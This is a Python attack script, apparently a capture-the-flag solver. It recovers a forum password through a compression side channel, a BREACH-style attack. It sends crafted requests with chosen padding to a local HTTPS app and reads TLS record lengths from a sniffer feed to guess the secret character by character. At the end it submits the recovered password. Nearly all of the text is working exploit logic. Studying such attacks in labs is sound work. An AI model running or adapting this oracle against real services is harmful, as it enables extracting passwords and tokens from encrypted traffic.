from pwn import *
from json import loads
import requests
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
import threading

url = "https://localhost:5000/" + "@" + "password="
urllib3.disable_warnings(InsecureRequestWarning)
host = "localhost"

r = remote(host, 8888)

# base64
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
padding_alphabet = "{}<>[]*!@#$^();"

# z, 0, + and / compress badly due to the image (and probably huffman codes)
# if nothing matches its good to see if they are the possible candidates 
# (their packet in alphabet method is usually longer when they are correct)
# and eventually backtrack
# there's no backtracking in this code so it sometimes fails,
# but it's good enough to solve the challenge if observed
# (then you can backtrack manually if needed)
password = ""

r.settimeout(None)

def receive_packet():
      # packet start
      p = r.recvuntil(b"[", timeout=5)
      if not p:
          print("Skipping")
          return None, None, (None,None), (None,None)
      counter = int(r.recvuntil(b"]").decode()[:-1])
      r.recvline()

      # packet src and dst
      src, dst = r.recvline().split(b" -> ")
      src = src.decode().strip().split(":")
      dst = dst.decode().strip().split(":")

      # packet content in json
      json = r.recvline().decode().strip()
      json = json.replace("'", '"')
      packet = loads(json)
      
      return packet, counter, src, dst

def alphabet_method(password, a, padding, base_len):
    stop = False
    while True:
        packet, counter, src, dst =  receive_packet()
        # we are only interested in packets from the forum-app
        if dst[1] != '5001':
            continue
        # we are only interested tls packet lengths
        length = int(packet['tls.record.length'])
        # we know that our packet contains the image, so its quite longer
        # than the handshake and other packets
        if length < 4000:
            continue
        print(length, base_len, a)

        if length == base_len:
            break
        elif length == base_len - 1:
            password += a
        elif base_len == 0:
            base_len = length
        # it might happen when A is the correct character
        elif length > base_len and a == "B":
            password += "A"
        break
    return base_len, password

def two_tries(password, a, padding):
    u = url + password + a + padding + "~" * len(padding)
    thread = threading.Thread(target=requests.get, args=(u,), kwargs={'verify': False})
    thread.start()
    
    while True:
        packet, counter, src, dst =  receive_packet()
        # we are only interested in packets from the forum-app
        if dst[1] != '5001':
            continue
        # we are only interested tls packet lengths
        length = int(packet['tls.record.length'])
        # we know that our packet contains the image, so its quite longer
        # than the handshake and other packets
        if length < 4000:
            continue
        length_try_1 = length
        break

    u = url + password + padding + a + "~" * len(padding)
    thread2 = threading.Thread(target=requests.get, args=(u,), kwargs={'verify': False})
    thread2.start()

    while True:
        packet, counter, src, dst =  receive_packet()
        # we are only interested in packets from the forum-app
        if dst[1] != '5001':
            continue
        # we are only interested tls packet lengths
        length = int(packet['tls.record.length'])
        # we know that our packet contains the image, so its quite longer
        # than the handshake and other packets
        if length < 4000:
            continue
        length_try_2 = length
        break
    print(length_try_1, length_try_2, a, padding)

    if length_try_1 < length_try_2:
        password += a
    thread.join()
    return password
    
t = r.recv(1024)
print(t)

# send a few requests to make sure packet sniffer is ready
requests.get(url, verify=False)
time.sleep(0.1)
requests.get(url, verify=False)
time.sleep(0.1)
requests.get(url, verify=False)

while r.can_recv(timeout=5):
    r.recv(32000)

alphabet_failed = False
while len(password) < 16:
    base_len = 0
    padding_len = randint(50, 100)

    l1 = len(password)
    padding_start = "".join([random.choice(padding_alphabet) for _ in range(padding_len)]) 
    for a in alphabet:
        l2 = len(password)
        if not alphabet_failed:
            padding = padding_start + "".join([i + "~" for i in alphabet if i != a])
            u = url + password + a + padding
            thread = threading.Thread(target=requests.get, args=(u,), kwargs={'verify': False})
            thread.start()
            base_len, password = alphabet_method(password, a, padding, base_len)
        else:
            password = two_tries(password, a, padding_start)

        if l2 < len(password):
            break
    if l1 == len(password):
        alphabet_failed = not alphabet_failed
    else:
        alphabet_failed = False

    print(password)
print(password)

if requests.post("https://localhost:5000/forum", verify=False, data=f"password={password}", headers=
                 {'Content-Type': 'application/x-www-form-urlencoded'}).status_code != 200:
    exit(0)
exit(1)
